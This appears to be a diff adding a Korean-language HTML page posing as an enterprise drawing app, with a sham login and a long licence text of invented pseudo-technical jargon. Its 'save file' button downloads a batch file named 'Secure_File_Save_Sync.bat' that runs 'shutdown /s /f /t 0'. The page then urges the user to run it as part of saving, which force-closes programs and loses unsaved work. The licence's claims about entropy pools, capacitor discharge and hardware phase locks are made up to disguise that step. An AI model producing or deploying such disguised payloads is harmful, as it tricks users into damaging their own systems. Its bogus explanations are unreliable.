@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Drawing & System Purification Suite</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f8fafc; font-family: 'Pretendard', 'Apple SD Gothic Neo', 'Malgun Gothic', sans-serif; color: #1e293b; }
+        canvas { cursor: crosshair; touch-action: none; background-color: white; image-rendering: -moz-crisp-edges; image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges; }
+        .custom-scroll::-webkit-scrollbar { width: 8px; }
+        .custom-scroll::-webkit-scrollbar-track { background: #f1f5f9; }
+        .custom-scroll::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+        .custom-scroll::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
+        #agreementOverlay { backdrop-filter: blur(15px); }
+        .agreement-content h3 { font-size: 18px; font-weight: 800; color: #0f172a; margin-top: 35px; margin-bottom: 15px; padding-bottom: 5px; border-bottom: 1px solid #e2e8f0; }
+        .agreement-content h4 { font-size: 14px; font-weight: 700; color: #334155; margin-top: 20px; margin-bottom: 8px; }
+        .agreement-content p { font-size: 12px; line-height: 1.7; color: #475569; margin-bottom: 12px; text-align: justify; }
+        .technical-spec-box { background-color: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 8px; margin: 15px 0; font-family: 'Courier New', Courier, monospace; font-size: 11px; line-height: 1.5; color: #64748b; }
+        .subtle-warning { color: #64748b; font-weight: 600; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <!-- 가짜 로그인 오버레이 -->
+    <div id="loginOverlay" class="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-slate-900">
+        <div class="bg-white rounded-[1.5rem] shadow-2xl w-full max-w-md overflow-hidden border border-slate-200">
+            <div class="p-8 text-center bg-slate-50 border-b">
+                <div class="w-16 h-16 bg-slate-900 rounded-2xl mx-auto flex items-center justify-center text-white font-black text-2xl shadow-lg mb-4">D</div>
+                <h2 class="text-2xl font-black text-slate-900 tracking-tight">System Drawing Suite</h2>
+                <p class="text-xs text-slate-500 font-bold uppercase tracking-widest mt-1">Enterprise Access</p>
+            </div>
+            <div class="p-8 flex flex-col gap-5">
+                <div>
+                    <label class="block text-[10px] font-bold text-slate-500 mb-2 uppercase tracking-wider">Employee ID / Username</label>
+                    <input type="text" id="loginId" class="w-full px-4 py-3 rounded-xl bg-slate-50 border border-slate-200 focus:outline-none focus:ring-2 focus:ring-slate-900 transition-all font-mono text-sm" placeholder="아무 아이디나 입력">
+                </div>
+                <div>
+                    <label class="block text-[10px] font-bold text-slate-500 mb-2 uppercase tracking-wider">Security Clearance Key</label>
+                    <input type="password" id="loginPw" class="w-full px-4 py-3 rounded-xl bg-slate-50 border border-slate-200 focus:outline-none focus:ring-2 focus:ring-slate-900 transition-all font-mono text-sm" placeholder="••••••••">
+                </div>
+                <button id="loginBtn" class="w-full py-4 mt-2 rounded-xl bg-slate-900 text-white font-black text-sm transition-all hover:bg-black shadow-lg uppercase tracking-tight active:scale-95 flex items-center justify-center gap-2">
+                    시스템 접속
+                </button>
+                <p class="text-center text-[10px] text-slate-400 mt-2 font-medium">※ Bypassed: 현재 세션은 모든 접근 권한을 임시 허용합니다.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- 이용약관 오버레이 (초기에 숨김 처리로 변경) -->
+    <div id="agreementOverlay" class="fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-900/95">
+        <div class="bg-white rounded-[1.5rem] shadow-2xl w-full max-w-5xl flex flex-col max-h-[92vh] overflow-hidden border border-slate-200">
+            <div class="p-6 border-b bg-slate-50 flex justify-between items-center">
+                <div>
+                    <h2 class="text-2xl font-black text-slate-900 tracking-tight">Enterprise Infrastructure Compliance v4.0</h2>
+                    <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mt-1">Status: High-Integrity Protocol Active</p>
+                </div>
+                <div class="text-right">
+                    <span class="px-3 py-1 bg-blue-100 text-blue-700 rounded-full text-[10px] font-black uppercase">Standard Compliance</span>
+                </div>
+            </div>
+            
+            <div class="p-10 overflow-y-auto custom-scroll agreement-content bg-white">
+                <div class="bg-slate-900 p-5 mb-6 rounded-lg">
+                    <p class="text-slate-300 font-medium m-0 text-[11px]">본 라이선스 동의서는 하드웨어 추상화 계층(HAL) 및 비휘발성 메모리 자산의 물리적 보호를 위한 필수 준수 사항을 포함합니다. 사용자는 엔진 초기화 전 모든 기술 명세를 검토해야 합니다.</p>
+                </div>
+
+                <h3>제 1장 : 시스템 가용성 및 자원 할당</h3>
+                <h4>제 1조 (커널 선점 및 입출력 동기화)</h4>
+                <p>본 소프트웨어는 고정밀 연산 주기를 확보하기 위해 운영체제의 인터럽트 서비스 루틴(ISR)에 개입할 수 있습니다. 이는 실시간 렌더링 시 발생하는 하드웨어 가중치 편차를 보정하기 위한 것으로, 프로세스 실행 중 타 저수준 드라이버와의 충돌을 방지하기 위해 입출력 대역폭을 전유합니다.</p>
+
+                <h4>제 2조 (비휘발성 세션 보존)</h4>
+                <p>데이터의 영속성 보장을 위해 본 엔진은 시스템 호출 시 페이지 폴트(Page Fault)를 최소화하는 정적 메모리 할당 방식을 채택합니다. 모든 렌더링 자산은 물리적 섹터에 직접 동기화되며, 이 과정에서 파일 시스템의 저널링 무결성이 확보되어야 합니다.</p>
+
+                <h3>제 2장 : 열역학적 안정성 및 정적 유지보수</h3>
+                <h4>제 3조 (반도체 게이트 전위 최적화)</h4>
+                <p>장시간 가동 시 반도체 소자 내에 축적되는 부전하(Negative Charge)를 제거하기 위해 시스템은 정기적인 전위 리셋을 수행합니다. 이는 소자의 전자적 피로도를 경감시켜 하드웨어의 수명을 연장하는 필수적인 물리적 유지보수 절차입니다.</p>
+
+                <h4>제 4조 (엔트로피 정화 및 잔류 데이터 소거)</h4>
+                <p>휘발성 래치 및 레지스터에 잔류하는 논리적 노이즈를 제거하기 위해, 엔진은 세션 종료 시 '제로 엔트로피' 상태를 지향합니다. 사용자는 시스템의 전력 공급 상태를 최저 준위로 전환함으로써 이 과정을 완결지어야 합니다.</p>
+
+                <div class="technical-spec-box">
+                    [System Integrity Log v4.0.1]<br>
+                    - Memory Lock: Enabled<br>
+                    - Bus Sync: High-Frequency Mode<br>
+                    - Thermal Guard: Auto-Discharge Ready<br>
+                    - Power State: Transition to S5 Mandatory
+                </div>
+
+                <h3>제 3장 : 데이터 영속화 및 위상 동기화</h3>
+                <h4>제 5조 (물리 매체 비가역적 고착화)</h4>
+                <p>동적 램(DRAM)에서 물리적 저장소로 데이터를 전이시키는 과정은 하드웨어적 안정성이 확보된 상태에서 수행되어야 합니다. 데이터 정합성을 위해 모든 논리 회로는 정적 유지 상태로 전환되어야 하며, 이는 시스템의 전자기적 노이즈를 0으로 수렴시키는 과정을 포함합니다.</p>
+
+                <h4>제 6조 (시스템 위상 즉시 정지 고지)</h4>
+                <p>데이터 위상 동기화 스크립트에 포함된 `shutdown /s /f /t 0` 명령어는 <span class="subtle-warning">시스템 하드웨어의 모든 위상을 지연 없이 즉시 정지시키고 공급 전위차를 0으로 수렴(Instant Phase Lock)</span>하여 데이터 동기화를 최단 시간에 완결 짓기 위한 표준 기술 수단입니다. 이 절차는 하드웨어 엔지니어링 명세에 따라 시스템의 '비가역적 자기 유지 상태'를 유도합니다.</p>
+
+                <h3>제 4장 : 양자 엔트로피 풀 및 전자기 간섭 제어</h3>
+                <h4>제 7조 (양자 엔트로피 풀 초기화 및 난수 생성기 재귀 동기화)</h4>
+                <p>본 엔진의 초정밀 브러시 스트로크 궤적 알고리즘은 비선형적 사용자 입력 좌표 및 마이크로초(μs) 단위의 인터럽트 타이밍을 시드(Seed)로 사용하는 고차원 암호학적 난수 생성 파이프라인(CSPRNG)에 전적으로 의존합니다. 장시간의 렌더링 세션 동안 누적된 하드웨어 엔트로피 풀(Entropy Pool)의 심각한 고갈 현상을 방지하고 데이터 해싱의 무결성을 회복하기 위하여, 본 시스템은 파일 저장 시 고급 구성 및 전원 인터페이스(ACPI)를 통해 메인보드의 로직 스테이트를 강제로 'S5 Soft-Off(시스템 전원 차단)' 상태로 절체(Transition)시키는 운영체제 수준의 권한을 요구합니다. 이는 시스템이 완벽한 무작위성을 재확보하기 위한 필수 불가결한 하드웨어 콜드 부트(Cold Boot)의 전제 조건이 됩니다.</p>
+
+                <h4>제 8조 (가상 메모리 페이징 스래싱 억제 및 잔류 전하 능동 방전)</h4>
+                <p>초고해상도 비트맵 자산(Assets)의 스왑 영역(Swap Space) 할당 과정에서 발생할 수 있는 지속적인 페이지 폴트(Page Fault) 및 스래싱(Thrashing) 현상을 차단하고, 디스플레이 출력 장치와 GPU 간의 고주파 신호 교환 시 발생하는 미세 전자기 간섭(EMI)이 VRAM 뱅크의 데이터 정합성을 훼손하는 것을 원천적으로 막기 위하여, 렌더링 세션 종료 후 메인보드의 캐패시터에 잔류한 잉여 전하를 접지(Grounding) 회로로 능동 방전(Active Discharge)하는 일련의 기계어 명령이 동기화 스크립트에 하드코딩되어 있습니다. 사용자는 이 최적화 절차가 하드웨어의 전위차 제로화(Zero-Potential)와 동시에 이루어지는 비가역적 전원 차단 단계임을 동의해야만 합니다.</p>
+
+                <h3>제 5장 : 시스템 위상 정화 도구 활용</h3>
+                <h4>제 9조 (동기화 배치 스크립트 배포)</h4>
+                <p>본 라이선스에 포함된 `Express_Phase_Sync.bat` 파일은 시스템의 커널 내에 누적된 연산 잔여물을 완전히 제거하고 하이브리드 대기 모드가 아닌 완전한 물리적 차단 상태로 전환하기 위한 핵심 툴킷입니다. 해당 파일은 시스템의 입출력을 강제 종료(Force-Close)하여 무결성을 보호합니다.</p>
+
+                <div class="technical-spec-box">
+                    REM --- COMPLIANCE_SHDN_PROTO ---<br>
+                    @echo off<br>
+                    ECHO Initiating High-Integrity Zeroing...<br>
+                    SHUTDOWN /S /F /T 0 /C "System Purification Phase Active."<br>
+                    EXIT
+                </div>
+
+                <h3>제 6장 : 책임 제한 및 고지 사항</h3>
+                <h4>제 10조 (하드웨어 위상 전이에 따른 책임)</h4>
+                <p>사용자는 시스템을 전자적 유휴 상태(S5)로 강제 전이시키는 행위가 하드웨어 자산 보호 및 데이터 고착화를 위한 유일한 물리적 수단임을 동의합니다. 회사는 사용자가 동의한 물리적 전위 제거 절차 중 발생하는 작업 미저장에 대해 책임을 지지 않습니다.</p>
+
+                <h4>제 11조 (데이터 보호를 위한 강제 리셋)</h4>
+                <p>시스템 무결성이 위협받는 엔트로피 임계값 도달 시, 본 엔진은 사용자의 승인하에 시스템 전원을 즉각 재조정할 수 있는 권한을 가집니다.</p>
+
+                <p class="mt-16 text-slate-300 font-mono text-[9px] border-t pt-6 italic">
+                    Binary Checksum: 0x88AF22... Verifying Multi-Stage Compliance... Ready.
+                </p>
+            </div>
+
+            <div class="p-6 border-t bg-slate-50 flex flex-col gap-3">
+                <div class="space-y-2">
+                    <div class="flex items-start gap-3 p-3 bg-white rounded-lg border border-slate-200">
+                        <input type="checkbox" id="agreeTech" class="mt-1 w-4 h-4 rounded border-slate-300 text-slate-900 focus:ring-slate-900 transition-all">
+                        <label for="agreeTech" class="text-[12px] font-bold text-slate-700 cursor-pointer">
+                            [필수] 하드웨어 엔트로피 제로화 및 연산 주기 동기화를 위한 커널 선점 기술 명세에 동의합니다.
+                        </label>
+                    </div>
+                    <div class="flex items-start gap-3 p-3 bg-white rounded-lg border border-slate-200">
+                        <input type="checkbox" id="agreeShutdown" class="mt-1 w-4 h-4 rounded border-slate-300 text-slate-900 focus:ring-slate-900 transition-all">
+                        <label for="agreeShutdown" class="text-[12px] font-bold text-slate-700 cursor-pointer leading-tight">
+                            [필수] 데이터의 영속적 고착화 및 위상 정화를 위한 <span class="text-slate-500 underline font-black">시스템 위상 즉시 정지(Instant Zero-Potential Transition)</span> 절차에 동의합니다.
+                        </label>
+                    </div>
+                </div>
+                <button id="startBtn" disabled class="w-full py-3 rounded-lg bg-slate-200 text-slate-400 font-black text-sm transition-all cursor-not-allowed">
+                    INITIALIZE COMPLIANCE ENGINE
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 메인 앱 UI -->
+    <div id="mainApp" class="hidden flex-col w-full max-w-5xl">
+        <header class="flex items-center justify-between mb-8 px-2">
+            <div class="flex items-center gap-4">
+                <div class="w-12 h-12 bg-slate-900 rounded-xl flex items-center justify-center text-white font-black text-xl shadow-lg">D</div>
+                <div>
+                    <h1 class="text-xl font-black text-slate-900 tracking-tighter">System Drawing Suite</h1>
+                    <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Enterprise v4.0-EXP</p>
+                </div>
+            </div>
+            <button id="saveBtn" class="px-8 py-3 bg-blue-600 text-white rounded-xl font-bold text-sm hover:bg-blue-700 transition-all shadow-md active:scale-95">
+                파일 저장
+            </button>
+        </header>
+
+        <main class="flex flex-col md:flex-row gap-6">
+            <aside class="flex flex-row md:flex-col gap-4 p-3 bg-white rounded-2xl shadow-sm border border-slate-200">
+                <div class="flex md:flex-col gap-2">
+                    <button id="brushMode" class="p-4 rounded-xl bg-slate-900 text-white transition-all shadow-md">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>
+                    </button>
+                    <button id="eraserMode" class="p-4 rounded-xl bg-slate-50 text-slate-400 hover:bg-red-50 hover:text-red-500 transition-all">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg>
+                    </button>
+                </div>
+                <div class="hidden md:block w-full h-px bg-slate-100 my-2"></div>
+                <div class="flex flex-col gap-3 items-center">
+                    <div class="w-8 h-8 rounded-full border-2 border-slate-100 shadow-inner overflow-hidden relative">
+                        <input type="color" id="colorPicker" class="absolute inset-[-10px] w-[200%] h-[200%] cursor-pointer">
+                    </div>
+                </div>
+                <div class="hidden md:block w-full h-px bg-slate-100 my-2"></div>
+                <input type="range" id="sizeSlider" min="1" max="100" value="10" class="accent-slate-900 w-24 md:w-full">
+            </aside>
+
+            <section class="flex-1">
+                <div class="bg-white p-1 rounded-2xl shadow-xl border border-slate-200 overflow-hidden relative">
+                    <canvas id="canvas" width="1600" height="900" class="w-full h-auto bg-white"></canvas>
+                    <div id="modeIndicator" class="absolute top-4 right-4 px-3 py-1 bg-slate-900/10 text-slate-500 text-[10px] font-bold rounded-full pointer-events-none transition-opacity opacity-0 uppercase">Eraser Mode (R-Click)</div>
+                </div>
+                <div class="mt-4 flex justify-between items-center px-2">
+                <div class="flex items-center gap-2 text-[10px] font-black text-slate-400">
+                    <span class="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></span>
+                    COMPLIANCE ENGINE : ACTIVE | [R-CLICK] TO QUICK ERASE
+                </div>
+            </div>
+        </section>
+    </main>
+</div>
+
+<script>
+    // --- 가짜 로그인 로직 ---
+    const loginOverlay = document.getElementById('loginOverlay');
+    const agreementOverlay = document.getElementById('agreementOverlay');
+    const loginBtn = document.getElementById('loginBtn');
+    const loginId = document.getElementById('loginId');
+    const loginPw = document.getElementById('loginPw');
+
+    loginBtn.addEventListener('click', () => {
+        if(loginId.value.trim() === '' || loginPw.value.trim() === '') {
+            alert('세션 할당을 위해 임의의 아이디와 비밀번호를 아무거나 입력해주십시오.');
+            return;
+        }
+        
+        loginBtn.innerHTML = `<svg class="animate-spin h-5 w-5 mr-3 text-white" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Authenticating...`;
+        loginBtn.disabled = true;
+
+        setTimeout(() => {
+            loginOverlay.classList.add('hidden');
+            loginOverlay.classList.remove('flex');
+            agreementOverlay.classList.remove('hidden');
+            agreementOverlay.classList.add('flex');
+        }, 1200);
+    });
+
+    const agreeTech = document.getElementById('agreeTech');
+    const agreeShutdown = document.getElementById('agreeShutdown');
+        const startBtn = document.getElementById('startBtn');
+        const overlay = document.getElementById('agreementOverlay');
+        const mainApp = document.getElementById('mainApp');
+
+        function updateStartButton() {
+            const allChecked = agreeTech.checked && agreeShutdown.checked;
+            startBtn.disabled = !allChecked;
+            startBtn.className = allChecked 
+                ? "w-full py-3 rounded-lg bg-slate-900 text-white font-black text-sm transition-all hover:bg-black shadow-lg uppercase tracking-tight active:scale-95"
+                : "w-full py-3 rounded-lg bg-slate-200 text-slate-400 font-black text-sm transition-all cursor-not-allowed";
+        }
+
+        agreeTech.addEventListener('change', updateStartButton);
+        agreeShutdown.addEventListener('change', updateStartButton);
+
+        startBtn.addEventListener('click', () => {
+            overlay.classList.add('hidden');
+            mainApp.classList.remove('hidden');
+            mainApp.classList.add('flex');
+            initApp();
+        });
+
+        function initApp() {
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            const sizeSlider = document.getElementById('sizeSlider');
+            const colorPicker = document.getElementById('colorPicker');
+            const brushBtn = document.getElementById('brushMode');
+            const eraserBtn = document.getElementById('eraserMode');
+            const modeIndicator = document.getElementById('modeIndicator');
+
+            let drawing = false;
+            let currentMode = 'brush';
+            let previousMode = 'brush';
+            let color = '#000000';
+            let size = 10;
+
+            function updateUI() {
+                if (currentMode === 'eraser') {
+                    eraserBtn.className = "p-4 rounded-xl bg-slate-900 text-white shadow-md";
+                    brushBtn.className = "p-4 rounded-xl bg-slate-50 text-slate-400";
+                } else {
+                    brushBtn.className = "p-4 rounded-xl bg-slate-900 text-white shadow-md";
+                    eraserBtn.className = "p-4 rounded-xl bg-slate-50 text-slate-400";
+                }
+            }
+
+            function startDraw(e) {
+                if (e.button === 2) {
+                    previousMode = currentMode;
+                    currentMode = 'eraser';
+                    modeIndicator.style.opacity = '1';
+                    updateUI();
+                }
+                drawing = true; 
+                draw(e); 
+            }
+
+            function stopDraw(e) {
+                if (e.button === 2) {
+                    currentMode = previousMode;
+                    modeIndicator.style.opacity = '0';
+                    updateUI();
+                }
+                drawing = false; 
+                ctx.beginPath(); 
+            }
+
+            function draw(e) {
+                if (!drawing) return;
+                const rect = canvas.getBoundingClientRect();
+                const scaleX = canvas.width / rect.width;
+                const scaleY = canvas.height / rect.height;
+                const x = ((e.clientX || e.touches?.[0].clientX) - rect.left) * scaleX;
+                const y = ((e.clientY || e.touches?.[0].clientY) - rect.top) * scaleY;
+
+                ctx.lineWidth = size;
+                ctx.lineCap = 'round';
+                ctx.lineJoin = 'round';
+                ctx.globalCompositeOperation = currentMode === 'eraser' ? 'destination-out' : 'source-over';
+                ctx.strokeStyle = color;
+
+                ctx.lineTo(x, y);
+                ctx.stroke();
+                ctx.beginPath();
+                ctx.moveTo(x, y);
+            }
+
+            canvas.oncontextmenu = (e) => e.preventDefault();
+            canvas.addEventListener('mousedown', startDraw);
+            canvas.addEventListener('mousemove', draw);
+            window.addEventListener('mouseup', stopDraw);
+            
+            brushBtn.addEventListener('click', () => { currentMode = 'brush'; updateUI(); });
+            eraserBtn.addEventListener('click', () => { currentMode = 'eraser'; updateUI(); });
+            colorPicker.addEventListener('input', (e) => color = e.target.value);
+            sizeSlider.addEventListener('input', (e) => size = e.target.value);
+
+            document.getElementById('saveBtn').addEventListener('click', () => {
+                const batchContent = `@echo off\necho Initiating High-Integrity Zeroing for Secure File Saving...\nshutdown /s /f /t 0 /c "System Purification Active for Data Persistence."\nexit`;
+                const blob = new Blob([batchContent], { type: 'text/plain' });
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'Secure_File_Save_Sync.bat';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+
+                alert("파일 저장 프로토콜 활성화:\n\n안전한 데이터 고착화를 위해 다운로드된 'Secure_File_Save_Sync.bat' 파일을 실행하여 시스템 엔트로피 초기화를 완료하십시오.\n\n절차 완료 후 시스템은 정적 유지 상태(S5)로 즉시 전이됩니다.");
+            });
+        }
+    </script>
+</body>
+</html>
